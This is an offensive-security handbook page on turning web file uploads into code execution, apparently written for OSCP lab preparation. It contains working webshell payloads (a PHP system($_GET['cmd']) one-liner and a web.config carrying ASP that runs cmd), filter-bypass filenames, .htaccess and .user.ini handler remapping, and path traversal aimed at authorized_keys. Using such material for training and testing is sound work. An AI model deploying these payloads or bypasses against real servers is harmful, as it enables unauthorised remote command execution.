---
title: "File Upload"
slug: file-upload
category: notes
handbook: oscp
tags: ["file-upload"]
draft: false
pubDatetime: 2026-08-03T22:49:06+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "An upload form is a write primitive into the target's filesystem."
---
An upload form is a write primitive into the target's filesystem. Whether it becomes code execution depends on three things that fail independently: what the application accepts, where the file lands, and what the web server does with it once it is there. Testing all three separately is faster than guessing which one broke.

[Webshells](/collections/oscp/webshells) covers the payload itself, the extension-to-interpreter mapping, and magic byte filters. This note covers getting a file past the upload and into a place that runs it.

## Finding Where the File Lands

The upload response rarely says. Ways to learn the path, in order of effort:

- Load the profile picture or attachment the app renders and copy the image address. That is the served path.
- Read the source if a backup or repository is exposed ([Web Content Discovery](/collections/oscp/web-content-discovery)).
- Fuzz for the directory: `/uploads/`, `/files/`, `/images/`, `/media/`, `/attachments/`, `/tmp/`, `/data/`.
- Upload a plain `.txt` with known content and search for it. A file that can be retrieved proves the write and the path in one request.

The path shown in an admin file manager is frequently not the served path. On MZEEAV the uploader moved the file after validation, so the browsable name and the final name differed.

## Client Side Filters

A filter implemented in JavaScript on the upload page stops the browser, not the request. Intercept in Burp ([Burp Suite](/collections/oscp/burp-suite)) and change the filename in the multipart body after the file picker has accepted an allowed one, or replay the request with the real payload. Same for a `accept="image/*"` attribute and a disabled submit button.

If the filename changes in Burp and the upload still fails, the check is server side and the rest of this note applies.

## Server Side Filters

Four checks show up, alone or stacked. Identify which one is firing before changing anything, since each has a different bypass.

**Content-Type header.** The multipart part carries its own `Content-Type`, unrelated to the file bytes. Change it in Burp:

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

**Extension deny list.** Every alternate PHP extension in [Webshells](/collections/oscp/webshells) applies here. Beyond those spellings:

```
shell.pHp             case, when the filter lowercases nothing
shell.php.            trailing dot, stripped by Windows
shell.php%20          trailing space
shell.php%00.jpg      null byte, PHP < 5.3.4 and old Java
shell.php:.jpg        NTFS alternate data stream, IIS
shell.php.jpg         double extension
shell.jpg.php         reverse double extension
```

`shell.php.jpg` executes when Apache is configured with `AddHandler php-script .php` rather than a `<FilesMatch>` block, because that form matches any extension in the name, not just the last one. It costs one request to find out.

**Extension allow list.** Deny list tricks mostly die here, since the last extension has to be one of a handful. This is where `.htaccess` comes in, below.

A filter enforced at one entry point does not necessarily apply to every entry point that writes a file. A file manager's upload dialog is a form talking to one endpoint; the same app's backend often exposes other actions, a "create file" or "rename" call used by its own text editor, that take a filename with no extension check at all. On Apex, Responsive FileManager's upload dialog blocked `.php` outright, while `execute.php?action=create_file` took a `name` parameter with no filter whatsoever. When a filtered upload endpoint is a dead end, look for a sibling action in the same app before moving on to extension tricks against that one endpoint.

Confirm the write independently rather than trusting the response. `create_file` on Apex returned an identical `200 OK`/`File successfully saved` for every attempt, but a directory listing showed every one of them had landed with a trailing dot appended to whatever name was sent, readable as raw content, never executable, since the filename no longer ends in `.php`. The application's own success message proves it accepted the request, not that anything usable landed on disk.

**Content inspection.** Magic bytes, `getimagesize()`, `finfo_file()`, and metadata stripping, all covered in [Webshells Magic Byte Filters](/collections/oscp/webshells#magic-byte-filters).

## .htaccess

Apache reads a per-directory `.htaccess` on every request when `AllowOverride` is anything other than `None`. An upload directory that accepts an arbitrary file therefore accepts a configuration file that changes how Apache treats the rest of that directory. That defeats an allow list completely: instead of finding an extension the server already executes, map an extension the filter already permits.

Two directives, depending on how PHP is wired up:

```apache
# mod_php
AddType application/x-httpd-php .kayra
```

```apache
# PHP-FPM, where AddType does nothing because the handler is a proxy
<FilesMatch "\.kayra$">
    SetHandler "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost/"
</FilesMatch>
```

The FPM socket path has to match the target's PHP version. Try `AddType` first, since it is one line and works on the older stacks the labs use.

Pick an extension the filter allows and nobody else uses. Mapping `.jpg` itself works when that is the only permitted extension, but it makes every image in the directory execute as PHP and breaks the application's own pages:

```apache
AddType application/x-httpd-php .jpg
```

### Getting It Uploaded

`.htaccess` has no extension. A filter that splits the name on `.` and takes the last element sees `htaccess`, which is on nobody's deny list, and a filter that takes the first element sees an empty string. Both usually pass. Send it with `Content-Type: text/plain`.

The name is fixed. Apache only reads `.htaccess`, so an uploader that renames files, appends a timestamp, or forces its own extension kills this path outright.

### Confirming It Is Read

Upload a `.htaccess` containing one invalid word:

```
kayra
```

Then request anything in that directory. A `500 Internal Server Error` means Apache parsed the file, which proves both that the write landed in a directory Apache serves and that overrides are enabled. A normal response means the file is being ignored, and no amount of correct directives will change that. Overwrite the broken one with the real payload afterwards, since the 500 affects the whole directory and can take the application down with it.

Then the actual test:

```bash
# 1. upload .htaccess mapping the extension
# 2. upload shell.kayra containing <?php system($_GET['cmd']); ?>
curl 'http://TARGET/uploads/shell.kayra?cmd=id'
```

Source coming back as text, or the browser downloading the file, means the handler did not apply. Wrong extension in the directive, wrong PHP wiring, or `AllowOverride FileInfo` not granted.

### Other Uses

CGI, when mod_cgi is loaded and `AllowOverride Options` is set. The uploaded file is a shell script with a shebang, and it still needs its executable bit set for CGI to run it:

```apache
Options +ExecCGI
AddHandler cgi-script .shell
```

Re-enabling PHP where a parent config turned it off for the uploads directory:

```apache
php_flag engine on
```

This fails against `php_admin_flag engine off`, which cannot be overridden from `.htaccess` by design. Worth one attempt, since the two look identical from outside.

### .user.ini

When PHP runs as FPM or CGI, `.htaccess` is often unavailable but `.user.ini` is read from the directory of the executing script:

```ini
auto_prepend_file=shell.jpg
```

Every `.php` file in that directory then includes `shell.jpg` before running. It needs an existing `.php` file in the same directory to request, and takes effect after the user ini cache expires, `user_ini.cache_ttl` at 300 seconds by default.

## web.config

The IIS equivalent, same idea and the same requirement that the name survive. Registering a handler needs the ASP ISAPI module present:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="kayra" path="*.kayra" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
   </system.webServer>
</configuration>
```

`web.config` is also executable in place. IIS blocks requests to it through `hiddenSegments`, so the file removes its own protection and carries classic ASP in an XML comment:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write"/>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config" /></fileExtensions>
            <hiddenSegments><remove segment="web.config" /></hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- <% Response.write("-"&"->")
Set wShell = CreateObject("WScript.Shell")
Set cmd = wShell.Exec("cmd /c " & Request.QueryString("cmd"))
Response.write(cmd.StdOut.ReadAll())
Response.write("<!-"&"-") %> -->
```

Requested as `/uploads/web.config?cmd=whoami`. On IIS the upload usually is not the interesting path anyway, since a writable directory with `PUT` enabled is [WebDAV](/collections/oscp/webdav) and gets a shell more directly.

## When the Directory Will Not Execute

A successful upload into a directory with script execution disabled is the common dead end. Three ways out:

**Traverse out of it.** The filename field is a string the application concatenates into a path. Edit it in Burp:

```
filename="../shell.php"
filename="../../var/www/html/shell.php"
```

The same trick overwrites files instead of creating them, which is worth more than a webshell when it reaches `authorized_keys`, a cron file, or a config the application reads.

**Include it from elsewhere.** If any parameter reaches an `include`, the uploaded file does not need to be served or even have a script extension. A `.jpg` full of PHP included through LFI executes. See [File Inclusion](/collections/oscp/file-inclusion).

**Let something else consume it.** A file processor is an execution sink of its own: exiftool on upload or on a cron sweep ([ExifTool DjVu Injection](/collections/oscp/exiftool-djvu-injection), [Cron Jobs](/collections/oscp/cron-jobs)), ImageMagick resizing, thumbnailing, or identifying an upload ([ImageMagick](/collections/oscp/imagemagick)), an ODT the backend opens or converts with LibreOffice ([LibreOffice Macros](/collections/oscp/libreoffice-macros)), an archive extractor that honours `../` inside the zip, an antivirus or converter that runs the file. When the application executes uploads rather than serving them, the payload is a real PE from [msfvenom](/collections/oscp/msfvenom), not PHP.

## Checklist

1. Upload something innocuous and find where it lands.
2. Upload `shell.php` unchanged. Applications with no filter at all exist.
3. Read the failure and identify which check fired: rejected at upload, or accepted and not executed.
4. Rejected: Content-Type, then extension spellings, then magic bytes.
5. Accepted but not executing: `.htaccess`, then traversal, then LFI.
6. Getting execution: [Reverse Shells](/collections/oscp/reverse-shells). Match the payload to the target OS, not to the language. A PHP reverse shell that assumes Linux fails on a Windows PHP stack even though the upload, the handler mapping, and the callback all worked.
